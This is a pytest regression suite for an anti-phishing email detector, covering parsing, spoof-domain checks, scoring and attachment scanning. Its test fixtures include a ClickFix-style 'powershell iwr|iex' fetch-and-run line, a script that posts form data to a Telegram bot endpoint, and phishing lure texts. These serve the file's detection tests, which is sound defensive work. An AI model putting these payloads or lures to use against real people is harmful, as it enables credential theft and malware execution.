"""v0.10 regression tests: parser, brand/URL logic, scoring, lure text, model hygiene, gate.

Everything here is generated in memory and harmless. Tests that depend on what
the trained model has learned are skipped when only the starter model exists
(run scripts/build_corpus.py + train.py first)."""
import base64
import os

import pytest

from antiphish import checks, features
from antiphish.brands import brand_claimed_by_display, brands_in_host, official_brand_of_host
from antiphish.domains import registrable_domain, skeleton, unwrap_redirect
from antiphish.email_parser import message_from_bytes_robust, parse_auth_results, parse_message
from antiphish.scorer import breakdown, score_signals


def _names(sigs):
    return [s["signal"] for s in sigs]


def _sig(name, weight, tier=None):
    d = {"signal": name, "weight": weight, "detail": ""}
    if tier:
        d["tier"] = tier
    return d


@pytest.fixture(scope="session")
def corpus_model():
    """Skip model-dependent assertions unless the installed model was trained on the corpus."""
    from antiphish.config import MODEL_PATH
    from antiphish.detector import _get_model
    from antiphish.model import model_meta
    _get_model()
    meta = model_meta(os.path.abspath(MODEL_PATH))
    if not (meta.get("training_data") or {}).get("corpus_present"):
        pytest.skip("needs the corpus-trained model: python scripts/build_corpus.py && python train.py")
    return meta


# ------------------------------------------------------------------ parser
HTML_MAIL = (
    b"From: \"IT Helpdesk\" <it@s1serv00431.cc>\r\nTo: jose@monkey.org\r\nSubject: Password for jose@monkey.org Expires\r\n"
    b"Authentication-Results: mx.example; dkim=fail header.d=other.com; dkim=pass header.d=s1serv00431.cc;\r\n"
    b" spf=pass smtp.mailfrom=info@s1serv00431.cc; dmarc=pass (policy=none) header.from=s1serv00431.cc\r\n"
    b"Authentication-Results: forged.example; spf=fail; dkim=fail; dmarc=fail\r\n"
    b"MIME-Version: 1.0\r\nContent-Type: multipart/alternative; boundary=B\r\n\r\n"
    b"--B\r\nContent-Type: text/plain\r\n\r\nPlain version.\r\n"
    b"--B\r\nContent-Type: text/html; charset=utf-8\r\n\r\n"
    b"<html><head><title>t</title><style>p{color:red}</style></head><body>"
    b"<div style='display:none'>hidden preheader text</div>"
    b"<p>Your password expires today, keep the same password:</p>"
    b"<a href=\"https://googleads.g.doubleclick.net/pcs/click?adurl=https%3A%2F%2Fevil.example%2Fl\">KEEP PASSWORD</a>"
    b"<a href='mailto:help@gmail.com'>mail</a> <a href='tel:+1-888-423-1943'>call</a>"
    b"<!--[if mso]><v:roundrect href=\"https://only-outlook.example/go\"></v:roundrect><![endif]-->"
    b"</body></html>\r\n--B--\r\n")


def test_parser_keeps_link_targets_and_separates_hidden_text():
    d = parse_message(message_from_bytes_robust(HTML_MAIL))
    assert "https://googleads.g.doubleclick.net/pcs/click?adurl=https%3A%2F%2Fevil.example%2Fl" in d["urls"]
    assert "https://only-outlook.example/go" in d["urls"], "link hidden in an Outlook conditional comment"
    assert ("https://googleads.g.doubleclick.net/pcs/click?adurl=https%3A%2F%2Fevil.example%2Fl",
            "KEEP PASSWORD") in d["links"]
    assert "hidden preheader" not in d["body"] and "hidden preheader" in d["hidden_text"]
    assert "color:red" not in d["body"]
    assert d["phones"] == ["+18884231943"] and d["link_emails"] == ["help@gmail.com"]
    assert d["to"] == ["jose@monkey.org"]


def test_parser_trusts_only_the_top_authentication_results_header():
    d = parse_message(message_from_bytes_robust(HTML_MAIL))
    assert (d["spf"], d["dkim"], d["dmarc"]) == ("pass", "pass", "pass")      # not the forged 2nd header
    assert d["dkim_domains"] == ["s1serv00431.cc"] and d["dmarc_policy"] == "none"
    assert checks.auth_aligned(d)


def test_parser_microsoft_style_and_missing_header():
    import email
    m = email.message_from_string("Authentication-Results: spf=pass (sender IP is 40.1.1.1) smtp.mailfrom=contoso.com; "
                                  "dkim=pass (signature was verified) header.d=contoso.com;dmarc=pass action=none "
                                  "header.from=contoso.com;compauth=pass reason=100\nFrom: a@contoso.com\n\nx")
    a = parse_auth_results(m)
    assert a["dmarc"] == "pass" and a["compauth"] == "pass" and a["spf_domain"] == "contoso.com"
    assert parse_auth_results(email.message_from_string("From: a@b.com\n\nx"))["dmarc"] is None


def test_parser_special_parts_become_scannable():
    png = base64.b64encode(b"\x89PNG\r\n\x1a\n" + b"0" * 600).decode()
    raw = ("From: x@y.top\r\nTo: me@corp.com\r\nSubject: s\r\nMIME-Version: 1.0\r\n"
           "Content-Type: multipart/mixed; boundary=B\r\n\r\n"
           "--B\r\nContent-Type: text/html\r\n\r\n<p>outer body with enough text to be the visible html body</p>\r\n"
           "--B\r\nContent-Type: text/calendar; method=REQUEST\r\n\r\nBEGIN:VCALENDAR\r\nEND:VCALENDAR\r\n"
           "--B\r\nContent-Type: image/png\r\nContent-ID: <qr1>\r\nContent-Transfer-Encoding: base64\r\n\r\n" + png + "\r\n"
           "--B\r\nContent-Type: text/html; name=\"DOCS.html\"\r\nContent-Disposition: inline; filename=\"DOCS.html\"\r\n\r\n"
           "<form><input type=password></form>\r\n"
           "--B\r\nContent-Type: message/rfc822\r\n\r\nFrom: a@b.c\r\nSubject: inner\r\n\r\ninner body http://inner.example/\r\n"
           "--B--\r\n").encode()
    d = parse_message(message_from_bytes_robust(raw))
    assert d["attachments"] == ["invite.ics", "DOCS.html", "attached.eml"]
    assert list(d["inline_images"]) == ["inline-image-1"]
    assert "inner body" not in d["body"], "an attached e-mail is an attachment, not this message's body"
    assert d["urls"] == []


# ------------------------------------------------------------------ brands / URLs
REAL_INFRASTRUCTURE = [
    "s3.amazonaws.com", "login.microsoftonline.com", "store.steampowered.com", "lh3.googleusercontent.com",
    "www.paypalobjects.com", "www.pineapple.com", "www.baseball.com", "facebookmail.com", "fonts.googleapis.com",
    "www.amazon.de", "accounts.google.com", "ikea.rs", "www.dhl.ba", "raiffeisenbank.ba", "www.posta.rs", "seb.se",
    "purchase-order.com", "www.revolution.com", "finance.yahoo.com", "applied-research.org", "express.co.uk",
    "steamboat.com", "cpanel.mojafirma.ba", "posta.mojafirma.ba", "www.uprava.ba", "contoso.sharepoint.com",
    "evil.onmicrosoft.com", "user.github.io", "bucket.s3.amazonaws.com", "www.goggles.com", "x.com",
]
SPOOFS = [
    "paypal.evil-host.tk", "paypal.com.secure-login.tk", "microsoft.account-verify.top", "paypa1.com",
    "rnicrosoft.com", "secure-paypal.com", "paypalsecure-login.top", "micros0ft-support.net", "arnazon.co",
    "netfiix.com", "linkedln.com", "dhl-tracking.top", "raiffeisen-ebanking.top", "skatteverket-aterbetalning.com",
    "office365.evil.pages.dev", "appleid-verify.com", "docusing.net", "paypal-secure.github.io",
    "euprava.povrat-poreza.top", "postnord.paket-avgift.info",
]


@pytest.mark.parametrize("host", REAL_INFRASTRUCTURE)
def test_real_brand_infrastructure_is_not_called_spoofing(host):
    assert brands_in_host(host) == (), host
    assert "url_brand_spoof" not in _names(checks.check_url("https://" + host + "/x"))


@pytest.mark.parametrize("host", SPOOFS)
def test_brand_spoof_patterns_are_caught(host):
    refs = brands_in_host(host)
    assert refs and refs[0][2] == "high", (host, refs)
    n = _names(checks.check_url("https://" + host + "/login"))
    assert "url_brand_spoof" in n or "url_lookalike_domain" in n, (host, n)


def test_lookalike_skeletons():
    assert skeleton("paypa1") == skeleton("paypal") and skeleton("rnicrosoft") == skeleton("microsoft")
    assert skeleton("pаypal") == skeleton("paypal")            # Cyrillic 'а'
    assert official_brand_of_host("paypal.com") == "paypal" and official_brand_of_host("paypa1.com") is None


def test_registrable_domain_treats_platform_tenants_separately():
    assert registrable_domain("a.b.evil.pages.dev") == "evil.pages.dev"
    assert registrable_domain("reply.ebay.co.uk") == "ebay.co.uk"
    assert registrable_domain("tenant.onmicrosoft.com") == "tenant.onmicrosoft.com"


@pytest.mark.parametrize("url,target", [
    ("https://nam02.safelinks.protection.outlook.com/?url=https%3A%2F%2Fevil.example%2Flogin&data=05", "https://evil.example/login"),
    ("https://urldefense.com/v3/__https://evil.example/a/b__;!!abc", "https://evil.example/a/b"),
    ("https://urldefense.proofpoint.com/v2/url?u=https-3A__evil.example_path&d=x", "https://evil.example/path"),
    ("https://www.google.com/url?q=https://evil.example/x&sa=D", "https://evil.example/x"),
    ("https://googleads.g.doubleclick.net/pcs/click?adurl=https%3A%2F%2Fevil.example%2Fl", "https://evil.example/l"),
    ("https://example.com/page?id=5&q=hello", None),
])
def test_redirectors_are_unwrapped(url, target):
    assert unwrap_redirect(url) == target


def test_url_signals_new_infrastructure_abuse():
    n = lambda u: _names(checks.check_url(u))            # noqa: E731
    assert "url_ipfs_gateway" in n("https://ipfs.io/ipfs/bafy/index.html")
    assert "url_free_hosting" in n("https://m365-keep-pass.pages.dev/auth")
    assert "url_wildcard_dns" in n("https://1.2.3.4.sslip.io/x")
    assert "url_dynamic_dns" in n("https://abc.duckdns.org/l")
    assert "url_download_executable" in n("https://example.com/files/setup.exe")
    assert "url_download_executable" not in n("https://order.example.com/wc.dll?order=1")   # old CGI endpoint
    # a redirect through a trusted site is followed to its real target
    r = n("https://www.google.com/url?q=https%3A%2F%2Fvm-portal-login.web.app%2Flisten")
    assert "url_open_redirect" in r and "url_free_hosting" in r
    # a security gateway rewriting a link to a real brand site is not a red flag
    assert n("https://nam02.safelinks.protection.outlook.com/?url=https%3A%2F%2Fwww.dhl.com%2Ftrack") == []
    # object storage: a logo is fine, a web page is not
    assert n("https://bucket.s3.amazonaws.com/img/logo.png") == []
    assert "url_free_hosting" in n("https://bucket.s3.amazonaws.com/login/index.html")


def test_shortener_and_idn_false_positives_fixed():
    n = lambda u: _names(checks.check_url(u))            # noqa: E731
    assert "url_shortener" in n("https://bit.ly/abc")
    assert "url_shortener" not in n("https://www.microsoft.co/x")        # v0.9: endswith('t.co')
    assert "url_shortener" not in n("https://pretty.ly/x")               # v0.9: every .ly domain
    assert "url_punycode" in n("https://xn--pple-43d.com/unlock")        # Cyrillic 'а' + pple
    assert "url_punycode" not in n("https://xn--frskringskassan-7hb7x.se/")   # real Swedish IDN
    private = checks.check_url("http://192.168.1.1/login")
    assert private[0]["signal"] == "url_ip_host" and private[0]["weight"] < 10 and private[0]["tier"] == "context"
    assert checks.check_url("http://203.0.113.9/login")[0]["weight"] >= 20


def test_link_text_mismatch():
    hit = checks.check_links([("http://198.51.100.23/webscr/login.php", "https://www.paypal.com/signin")],
                             "PayPal <service@paypal.com>")
    assert hit and hit[0]["signal"] == "url_text_mismatch" and hit[0]["weight"] == 30
    # ESP click tracking and plain anchor text are normal
    assert checks.check_links([("https://shop.us12.list-manage.com/track/click?u=1", "www.shop.eu")],
                              "Shop <news@shop.eu>") == []
    assert checks.check_links([("https://evil.example/x", "Click here")], "a@b.com") == []


# ------------------------------------------------------------------ sender
def test_display_name_checks_no_longer_match_substrings():
    for s in ["Sebastian Lindqvist <sebastian.lindqvist@gmail.com>", "John Appleseed <john@acme-consulting.com>",
              "Chase Williams <chase@firma.com>", "Start-ups Weekly <news@startups.example>",
              "PayPal <service@paypal.com>", "DHL Express <noreply@dhl.de>"]:
        assert "sender_displayname_spoof" not in _names(checks.check_display_name(s)), s
    for s in ["PayPal Support <security.alerts@gmail.com>", "DHL Express <bhargav.v@stedrant.com>",
              "PayPal <service@paypal-secure-center.com>", "Ventas_Netflíx <info@mafuluxta.com>",
              "Pošta Srbije <obavestenje@dostava-paketa-info.com>"]:
        assert "sender_displayname_spoof" in _names(checks.check_display_name(s)), s
    assert brand_claimed_by_display("Ana via Microsoft Teams")[1] is False     # mention, not a claim


def test_cyrillic_names_are_normal_but_mixed_alphabets_are_not():
    assert checks.check_sender("Петар Петровић <petar.petrovic@firma.rs>") == []
    assert "sender_mixed_alphabet" in _names(checks.check_sender("PayPal <service@pаypal.com>"))
    assert "sender_lookalike_domain" in _names(checks.check_sender("PayPal <service@paypa1.com>"))


def test_reply_to_rules():
    cs = checks.check_sender
    assert "reply_to_mismatch" not in _names(cs("Tarik <t@gmail.com>", "list@googlegroups.com", {"list_id": "x"}))
    free = cs("CEO <ceo@company-mail.net>", "ceo.private@gmail.com")
    assert free[0]["signal"] == "reply_to_mismatch" and free[0]["weight"] == 20
    other = [s for s in cs("Acme <support@acme.zendesk.com>", "support@acme.com") if s["signal"] == "reply_to_mismatch"]
    assert other and other[0].get("tier") == "context"


def test_role_and_recipient_context():
    assert "sender_freemail_role" in _names(checks.check_freemail_sender("Emir CEO <emir.ceo@gmail.com>"))
    assert checks.check_freemail_sender("Johan Berg <johan.berg84@gmail.com>") == []
    ctx = checks.check_recipient_context
    assert "sender_impersonates_recipient_org" in _names(ctx({
        "to": ["jose@monkey.org"], "sender": "monkey.org Server Administrator <x@firma.pl>", "subject": "Password"}))
    r = _names(ctx({"to": ["amra@firma.ba"], "sender": "IT Helpdesk <n@it-servicedesk-portal.com>",
                    "subject": "Password for amra@firma.ba expires today"}))
    assert "subject_contains_recipient" in r and "sender_internal_role_external" in r
    assert ctx({"to": ["amra@firma.ba"], "sender": "IT podrška <it@firma.ba>", "subject": "Podsjetnik"}) == []


def test_auth_pass_is_weak_and_failures_are_capped():
    ok = checks.check_auth("pass", "pass", "pass")
    assert ok[0]["signal"] == "auth_all_pass" and -6 <= ok[0]["weight"] < 0
    bad = checks.check_auth("fail", "fail", "fail", {"dmarc_policy": "reject"})
    assert sum(s["weight"] for s in bad) <= 45, "three failed checks are one fact, not three"
    assert sum(s["weight"] for s in checks.check_auth("none", "none", "none")) <= 8


# ------------------------------------------------------------------ scorer
def test_score_negative_evidence_no_longer_explodes():
    """v0.9: SPF+DKIM+DMARC pass (-15) with ML=0.99 scored 7 (LOW)."""
    score, _, level = score_signals([_sig("auth_all_pass", -3)], 0.99)
    assert level in ("SUSPICIOUS", "HIGH") and score > 45
    assert score_signals([_sig("auth_all_pass", -3), _sig("legit_bulk_sender", -12)], 0.02)[0] == 0.0


def test_score_firm_evidence_alone_reaches_high_and_soft_piles_are_capped():
    assert score_signals([_sig("url_brand_spoof", 30)], 0.0)[2] == "HIGH"       # v0.9 max without ML: 54.9
    assert score_signals([_sig("url_brand_spoof", 30), _sig("sender_displayname_spoof", 28)], 0.0)[2] == "CRITICAL"
    soft = [_sig("text_urgency_high", 14), _sig("text_threat", 12), _sig("text_credential_ask", 16),
            _sig("text_money_pressure", 8), _sig("text_generic_greeting", 6)]
    b = breakdown(soft, 0.9)
    assert b["soft"] == 32 and b["soft_uncapped"] == 56
    # the same wording counts for little when the text model is sure the mail is legitimate
    assert score_signals(soft, 0.01)[2] == "LOW"
    assert score_signals(soft, 0.9)[2] in ("HIGH", "CRITICAL")


def test_score_mitigation_cannot_argue_away_firm_evidence():
    firm = [_sig("url_lookalike_domain", 30)]
    with_trust = firm + [_sig("legit_bulk_sender", -12), _sig("auth_all_pass", -3)]
    assert score_signals(with_trust, 0.0)[0] == score_signals(firm, 0.0)[0]


def test_score_ml_alone_is_capped_below_critical():
    assert score_signals([], 1.0)[2] == "HIGH"
    assert score_signals([], 0.9)[2] == "SUSPICIOUS"
    assert score_signals([], 0.5)[0] == 0.0


# ------------------------------------------------------------------ text
def _text_names(text, **kw):
    return _names(features.analyze_text(text, **kw))


def test_text_bec_families():
    assert "text_gift_card_request" in _text_names(
        "Are you at your desk? I need you to buy 5 gift cards for a client today. Keep this confidential.")
    assert "text_bank_detail_change" in _text_names(
        "Please note our bank details have changed. All future invoices should be paid to the new IBAN below.")
    assert "text_payroll_change" in _text_names(
        "I changed banks and want to update my direct deposit before the next payroll.")
    n = _text_names("Amra, jesi li za stolom? Na sastanku sam. Kupi 5 Apple gift kartica i pošalji mi kodove.")
    assert "text_gift_card_request" in n and "text_bec_pretext" in n
    # a marketing mention of gift cards is not a request
    assert "text_gift_card_request" not in _text_names("Get a $20 gift card when you open a new account this month.")


def test_text_modern_lures():
    assert "text_device_code_lure" in _text_names("Go to microsoft.com/devicelogin and enter the code XQ7-PLM2")
    assert "text_clickfix" in _text_names("To verify you are human press Windows + R, then press Ctrl + V and Enter")
    assert "text_callback_lure" in _text_names(
        "Your Norton subscription was renewed for $399.99. If you did not authorize this charge call +1 (888) 423-1943.")
    assert "text_callback_lure" not in _text_names(
        "Thanks for your order. To cancel your order call us at +1 (888) 423-1943 within 24 hours.")
    assert "text_wallet_phrase" in _text_names("Enter your 12-word recovery phrase to validate your wallet.")
    assert "text_delivery_fee_lure" in _text_names("Your package is held at customs. A customs fee of 1.99 EUR is required.")


@pytest.mark.parametrize("text", [
    "Hitno: vaš nalog će biti blokiran. Potvrdite podatke za e-bankarstvo u roku od 24 sata.",
    "Хитно: ваш налог ће бити блокиран. Потврдите лозинку у року од 24 сата.",          # Serbian Cyrillic
    "Ditt konto kommer att spärras. Bekräfta din identitet med BankID omedelbart.",
    "Urgent: Your account will be suspended. Verify your identity within 24 hours.",
])
def test_text_patterns_work_across_languages_and_scripts(text):
    n = _text_names(text)
    assert "text_credential_ask" in n and "text_threat" in n, n


@pytest.mark.parametrize("text", [
    "Hi all, minutes attached. Next steps: Anna sends the draft by Friday, we review on Monday.",
    "Your order has shipped. Order #88213 is on its way and should arrive Thursday.",
    "Your statement is ready in online banking. For your security we never ask for your password by email.",
    "Wonderful news, we won the tender! Payment terms 30 days as agreed, invoice attached.",
    "The consumer is blocked while the thread is locked and the process is terminated by the scheduler.",
])
def test_text_stays_quiet_on_ordinary_mail(text):
    strong = [s for s in features.analyze_text(text) if s["weight"] >= 10]
    assert strong == [], strong


def test_text_obfuscation_signals():
    assert "text_mixed_script" in _text_names("Your Pаypal accоunt needs verificаtion nоw")     # Cyrillic а/о
    assert "text_invisible_chars" in _text_names("verify", html={"invisible_in_words": 5})


# ------------------------------------------------------------------ model hygiene
def test_scrub_recipient_removes_the_corpus_owners_identity():
    from antiphish.model import normalize_text, scrub_recipient
    t = scrub_recipient("Password for jose@monkey.org Expires. Dear jose, monkey.org Server Administrator",
                        ["jose@monkey.org"])
    low = t.lower()
    assert "jose" not in low and "monkey" not in low and "recipientaddress" in low
    assert scrub_recipient("Hi John, info about your order", ["info@shop.com"]) == "Hi John, info about your order"
    assert scrub_recipient("no recipient", None) == "no recipient"
    n = normalize_text("Visit https://evil.pages.dev/x?y=1 in 2025, mail a@b.com, Плаћање ističe")
    assert "urltoken tlddev" in n and "yeartoken" in n and "emailtoken" in n and "placanje istice" in n
    assert "evil" not in n, "hosts are not features: they are checked by the URL rules"


def test_model_file_from_other_feature_version_is_refused(tmp_path):
    import joblib

    from antiphish import model
    path = str(tmp_path / "m.joblib")
    model.save_model({"dummy": 1}, path)
    assert model.load_model(path) == {"dummy": 1}
    meta = model.model_meta(path)
    assert meta["feature_version"] == model.FEATURE_VERSION and meta["sklearn_version"]
    # same file, older feature pipeline -> must not load silently
    import json
    meta["feature_version"] = model.FEATURE_VERSION - 1
    json.dump(meta, open(path + ".meta.json", "w"))
    with pytest.raises(model.ModelIntegrityError):
        model.load_model(path)
    # tampering is still detected
    model.save_model({"dummy": 1}, path)
    joblib.dump({"dummy": 2}, path)
    with pytest.raises(model.ModelIntegrityError):
        model.load_model(path)


def test_balance_corpus_trims_phishing_when_a_legit_source_is_missing():
    from antiphish.model import MAX_PHISH_PER_LEGIT, balance_corpus
    rows = [("p", 1, "nazario", 2024)] * 100 + [("p", 1, "nazario_legacy", 2006)] * 500 + [("l", 0, "spamassassin", 2002)] * 200
    out = balance_corpus(rows, verbose=False)
    ph = sum(1 for r in out if r[1] == 1)
    assert ph <= MAX_PHISH_PER_LEGIT * 200 and sum(1 for r in out if r[2] == "nazario") == 100
    balanced = [("p", 1, "nazario", 2024)] * 100 + [("l", 0, "x", 2002)] * 100
    assert balance_corpus(balanced, verbose=False) == balanced


def test_synthetic_training_text_never_contains_probe_text():
    from antiphish import eval_sets
    from antiphish.model import load_starter
    texts, _ = load_starter()
    blob = "\n".join(texts).lower()
    for name, (probes, _label) in eval_sets.all_probe_sets().items():
        for p in probes:
            assert p.lower() not in blob, (name, p[:60])


# ------------------------------------------------------------------ detector
def test_detector_authenticated_phishing_is_not_low(corpus_model):
    """The single most common shape in the 2024-2025 corpus: attacker domain, DMARC pass."""
    from antiphish.detector import analyze_email
    r = analyze_email({
        "subject": "Action required: your Microsoft 365 password expires today",
        "sender": "IT Service Desk <helpdesk@it-servicedesk-portal.com>", "to": ["amra@firma.ba"],
        "body": "Your password expires in 2 hours. To keep your current password sign in here: "
                "https://it-servicedesk-portal.com/m365/keep-password",
        "spf": "pass", "dkim": "pass", "dmarc": "pass", "dmarc_from": "it-servicedesk-portal.com",
        "dkim_domains": ["it-servicedesk-portal.com"]}, use_url_intel=False)
    assert r["level"] in ("HIGH", "CRITICAL"), (r["score"], r["signals"])      # v0.9: 55.3 SUSPICIOUS


def test_detector_trust_discounts_need_a_clean_message(corpus_model):
    from antiphish.detector import analyze_email
    base = {"spf": "pass", "dkim": "pass", "dmarc": "pass", "list_unsubscribe": True}
    ok = analyze_email(dict(base, subject="What's new this month", sender="Shop <news@shop-example.eu>",
                            body="Product updates and stories from our community. Read the newsletter on our blog.",
                            dmarc_from="shop-example.eu", dkim_domains=["shop-example.eu"]), use_url_intel=False)
    assert "legit_bulk_sender" in _names(ok["signals"]) and ok["level"] == "LOW"
    bad = analyze_email(dict(base, subject="Your account will be suspended",
                             sender="Microsoft 365 <alerts@m365-secure-login.top>",
                             body="Verify your account and enter your password within 24 hours: "
                                  "http://m365-secure-login.top/microsoft/verify",
                             dmarc_from="m365-secure-login.top", dkim_domains=["m365-secure-login.top"]),
                        use_url_intel=False)
    assert "legit_bulk_sender" not in _names(bad["signals"]) and bad["level"] in ("HIGH", "CRITICAL")


def test_detector_reports_its_arithmetic():
    from antiphish.detector import analyze_email
    r = analyze_email({"subject": "Hi", "body": "See you tomorrow", "sender": "a@b.com"}, use_url_intel=False)
    assert {"firm", "context", "soft", "ml", "mitigation", "points"} <= set(r["score_breakdown"])


def test_detector_scans_qr_code_embedded_in_the_body():
    cv2 = pytest.importorskip("cv2")
    from antiphish.scenarios import _qr_png, eml
    qr = _qr_png("https://mfa-reenroll-portal.top/m365")
    raw = eml("Security <s@account-alerts.example>", "Re-enroll MFA", html="<p>Scan the code with your phone.</p>"
              "<img src='cid:qr@img'>", inline=[("qr.png", "image/png", qr)])
    d = parse_message(message_from_bytes_robust(raw))
    assert d["attachments"] == [] and "qr.png" in d["inline_images"]
    from antiphish.detector import analyze_email
    n = _names(analyze_email(d, use_url_intel=False)["signals"])
    assert "qr_code_url" in n and "url_suspicious_tld" in n
    assert cv2 is not None


# ------------------------------------------------------------------ attachments
def test_attachment_new_formats():
    from antiphish.attachment_scan import _ONENOTE_EMBED, _ONENOTE_MAGIC, scan_attachment
    assert "attachment_shortcut_file" in _names(scan_attachment("Compliance.rdp", b"full address:s:evil.example\n"))
    assert "attachment_executable" in _names(scan_attachment("invoice.xll", b"MZ" + b"\x00" * 100))
    one = _ONENOTE_MAGIC + b"\x00" * 40 + _ONENOTE_EMBED + b"powershell -enc AAAA .hta"
    assert "office_onenote_embedded" in _names(scan_attachment("Invoice.one", one))
    html = (b"<html><form><input type=password></form><script>fetch('https://api.telegram.org/bot1:A/sendMessage')"
            b"</script></html>")
    assert {"html_credential_form", "html_exfil_endpoint"} <= set(_names(scan_attachment("login.html", html)))
    svg = (b"<svg xmlns='http://www.w3.org/2000/svg'><foreignObject><iframe src='https://evil.example/l'></iframe>"
           b"</foreignObject></svg>")
    assert "svg_active_content" in _names(scan_attachment("doc.svg", svg))
    cf = (b"<html><h2>Verify you are human</h2><script>navigator.clipboard.writeText('powershell -w hidden iwr x|iex')"
          b"</script><p>Press Win + R, then Ctrl + V</p></html>")
    assert "html_clickfix" in _names(scan_attachment("verify.html", cf))


def test_attached_email_links_are_checked():
    from antiphish.attachment_scan import scan_attachment
    inner = (b"From: PayPal <x@paypa1-secure.tk>\r\nSubject: Verify\r\nMIME-Version: 1.0\r\nContent-Type: text/html\r\n\r\n"
             b"<p>Confirm your password:</p><a href='http://paypal.com.secure-login.tk/x'>Log in</a>")
    assert "url_brand_spoof" in _names(scan_attachment("original.eml", inner))


# ------------------------------------------------------------------ scenario suite
def test_scenarios_dev_set(corpus_model):
    """Regression lock on the dev scenarios (modern mail with real-looking headers)."""
    from antiphish.scenarios import run_scenarios
    rows = run_scenarios(group="dev")["rows"]
    legit_bad = [(r["name"], r["score"]) for r in rows if r["kind"] == "legit" and r["level"] != "LOW"]
    phish_bad = [(r["name"], r["score"]) for r in rows if r["kind"] == "phish" and r["level"] in ("LOW", "SUSPICIOUS")]
    assert legit_bad == [], f"legitimate mail flagged: {legit_bad}"
    assert phish_bad == [], f"phishing under-rated: {phish_bad}"


def test_scenarios_holdout_set_loose_bound(corpus_model):
    """Deliberately loose: a tripwire for regressions, NOT a target to tune against."""
    from antiphish.scenarios import run_scenarios
    rows = run_scenarios(group="holdout")["rows"]
    legit = [r for r in rows if r["kind"] == "legit"]
    phish = [r for r in rows if r["kind"] == "phish"]
    assert not [r["name"] for r in legit if r["level"] in ("HIGH", "CRITICAL")]
    assert sum(r["level"] == "LOW" for r in legit) >= 0.85 * len(legit)
    assert sum(r["level"] in ("HIGH", "CRITICAL") for r in phish) >= 0.85 * len(phish)


# ------------------------------------------------------------------ retraining gate
def test_gate_blocks_a_worse_model():
    from antiphish.learn import feedback_problems, gate
    live = {"probe_legit_false_alarms": 3, "probe_phish_missed": 2, "scenario_legit_not_low": 0, "scenario_phish_not_caught": 0}
    assert gate(dict(live), live) == []
    assert gate(dict(live, probe_phish_missed=4), live) == []                      # within tolerance
    fails = gate(dict(live, probe_phish_missed=20, scenario_phish_not_caught=9), live)
    assert len(fails) == 2 and "probe_phish_missed" in fails[0]
    assert gate({"probe_legit_false_alarms": 40, "probe_phish_missed": 0, "scenario_legit_not_low": 0,
                 "scenario_phish_not_caught": 0}, None)                            # no live model: absolute floor
    probs = feedback_problems(["Verify your account now please click", "verify your account now please  CLICK", "x"],
                              [1, 0, 1])
    assert any("BOTH" in p for p in probs) and any("shorter" in p for p in probs)


def test_corpus_builder_helpers():
    import sys
    sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "scripts"))
    import build_corpus as bc
    # the same campaign with another recipient / order number is one sample
    a = bc.dedup_key("Dear john@x.com your order 12345 shipped, track at https://a.example/t/1")
    b = bc.dedup_key("Dear mary@y.org your order 99871 shipped, track at https://a.example/t/2")
    assert a == b and a != bc.dedup_key("Completely different text about a meeting next week")
    msg = message_from_bytes_robust(b"From: a@b.c\r\nTo: jose@monkey.org\r\nSubject: Hello jose\r\n\r\n"
                                    b"Your mailbox jose@monkey.org on monkey.org is almost full, please act.\r\n")
    t = bc._text(msg).lower()
    assert "jose" not in t and "monkey" not in t


# ------------------------------------------------------------------ robustness (denial of service)
@pytest.mark.parametrize("name,body", [
    ("long run without @", "a" * 300_000),
    ("many almost-addresses", "abc.def+" * 40_000),
    ("blank lines", "Dear\n" + "\n" * 60_000 + "x@y.zz"),
    ("cyrillic then long latin", "Хитно " + "b" * 300_000),
    ("word soup", "verify your account " * 15_000),
])
def test_huge_or_hostile_text_is_scanned_in_bounded_time(name, body):
    """v0.9 ran unbounded regexes over the whole body: one large mail could pin a
    CPU for minutes (and the web app has only SCAN_CONCURRENCY slots)."""
    import time

    from antiphish.model import normalize_text
    t0 = time.perf_counter()
    features.analyze_text(body)
    normalize_text(body)
    took = time.perf_counter() - t0
    assert took < 3.0, f"{name}: {took:.1f}s"


def test_huge_html_is_parsed_in_bounded_time():
    import time
    html = ("<style>" * 4000 + "<p>hello</p>" + "<a href='http://x.example/" + "a" * 5000 + "'>x</a>" * 200
            + "<div style='display:none'>" * 3000 + "text " * 50_000)
    raw = ("From: a@b.c\r\nTo: d@e.f\r\nSubject: big\r\nMIME-Version: 1.0\r\nContent-Type: text/html\r\n\r\n" + html).encode()
    t0 = time.perf_counter()
    d = parse_message(message_from_bytes_robust(raw))
    from antiphish.detector import analyze_email
    analyze_email(d, use_url_intel=False)
    assert time.perf_counter() - t0 < 8.0


def test_monitor_quarantine_needs_technical_evidence():
    """Auto-moving mail is the one thing the tool does on its own: wording + ML must not trigger it."""
    from antiphish.monitor import should_quarantine
    assert should_quarantine({"score": 96.0, "score_breakdown": {"firm": 75.0}})
    assert not should_quarantine({"score": 96.0, "score_breakdown": {"firm": 12.0}})     # text-only verdict
    assert not should_quarantine({"score": 80.0, "score_breakdown": {"firm": 75.0}})
    assert should_quarantine({"score": 95.0})                                            # result without breakdown


def test_mime_bombs_are_bounded():
    """Deeply nested multiparts / e-mails attached inside e-mails must not blow the stack."""
    from email.message import EmailMessage

    from antiphish.attachment_scan import scan_attachment
    inner = EmailMessage()
    inner["Subject"] = "leaf"
    inner.set_content("leaf body http://203.0.113.9/x")
    for i in range(60):                                  # 60 levels of message-in-message
        outer = EmailMessage()
        outer["Subject"] = f"level {i}"
        outer.set_content("wrapper")
        outer.add_attachment(inner)
        inner = outer
    raw = inner.as_bytes()
    d = parse_message(message_from_bytes_robust(raw))
    assert d["attachments"] == ["attached.eml"]
    assert "archive_too_deep" in _names(scan_attachment("nested.eml", d["attachment_data"]["attached.eml"]))
    # nested multipart containers
    nested = b"From: a@b.c\r\nSubject: deep\r\nMIME-Version: 1.0\r\n"
    body = b"Content-Type: text/plain\r\n\r\nhello\r\n"
    for i in range(200):
        bnd = f"B{i}".encode()
        body = (b"Content-Type: multipart/mixed; boundary=" + bnd + b"\r\n\r\n--" + bnd + b"\r\n" + body
                + b"\r\n--" + bnd + b"--\r\n")
    parse_message(message_from_bytes_robust(nested + body))          # must simply return


def test_model_pipeline_has_no_unbounded_cache():
    """A cache keyed on whole e-mail texts would grow forever in the web server."""
    from antiphish import model
    assert not hasattr(model.normalize_text, "cache_info")
    pipe = model.build_pipeline()
    assert pipe.steps[0][0] == "normalize"
